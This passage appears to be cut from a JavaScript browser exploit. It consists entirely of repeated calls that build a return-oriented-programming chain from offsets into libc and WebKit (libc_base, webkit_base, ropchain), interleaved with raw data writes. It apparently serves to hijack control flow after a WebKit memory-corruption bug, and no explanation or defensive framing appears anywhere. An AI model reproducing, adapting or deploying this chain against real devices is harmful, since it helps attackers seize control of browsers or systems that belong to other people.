ropchain+119256,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+119312,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+119384,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+119440,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+119528,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+119632,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+119648,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+119792,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+119760,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+119776,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+119864,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+119920,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+120000,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([7, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+120104,
webkit_base+7438103,
libc_base+793877,
ropchain+120120,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+120208,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+120264,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+120368,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+120472,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+120488,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+120632,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+120600,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+120616,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+120704,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+120760,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+120840,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([31, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+120944,
webkit_base+7438103,
libc_base+793877,
ropchain+120960,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+121048,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+121104,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+121176,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+121232,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+788575,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+121368,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+121472,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+121488,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+121632,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+121600,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+121616,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+121704,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+121760,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+121840,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([32, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+121944,
webkit_base+7438103,
libc_base+793877,
ropchain+121960,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+122048,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+122104,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+122176,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+122232,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+122320,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+122424,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+122440,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+122584,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+122552,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+122568,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+122656,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+122712,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+122792,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([37, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+122896,
webkit_base+7438103,
libc_base+793877,
ropchain+122912,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+123000,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+123056,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+123160,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+123264,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+123280,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+123424,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+123392,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+123408,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+123496,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+123552,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+123632,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([33, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+123736,
webkit_base+7438103,
libc_base+793877,
ropchain+123752,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+123840,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+123896,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+123968,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+124024,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+471355,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+124160,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+124264,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+124280,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+124424,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+124392,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+124408,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+124496,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+124552,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+124632,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([34, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+124736,
webkit_base+7438103,
libc_base+793877,
ropchain+124752,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+124840,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+124896,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+124968,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+125024,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+811575,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+125160,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+125264,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+125280,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+125424,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+125392,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+125408,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+125496,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+125552,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+125632,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([35, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+125736,
webkit_base+7438103,
libc_base+793877,
ropchain+125752,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+125840,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+125896,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+125968,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+126024,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+126112,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([24, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+126216,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+126232,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+126376,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+126344,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+126360,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+126456,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+126560,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+126576,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+126720,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+126688,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+126704,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+126792,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+126848,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+126928,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([36, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+127032,
webkit_base+7438103,
libc_base+793877,
ropchain+127048,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+127136,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+127192,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+127264,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+127320,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+882884,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+127456,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+127560,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+127576,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+127720,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+127688,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+127704,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+127792,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+127848,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+127928,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([37, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+128032,
webkit_base+7438103,
libc_base+793877,
ropchain+128048,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+128136,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+128192,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+128264,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+128320,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+785097,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+128456,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+128560,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+128576,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+128720,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+128688,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+128704,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+128792,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+128848,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+128928,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([38, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+129032,
webkit_base+7438103,
libc_base+793877,
ropchain+129048,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+129136,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+129192,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+129264,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+129320,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+129448,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+129432,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+129544,
webkit_base+7438103,
libc_base+793877,
ropchain+129560,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+129672,
webkit_base+7438103,
libc_base+793877,
ropchain+129656,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+129744,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+129832,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+129864,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(webkit_base+432898,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+129976,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+129960,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
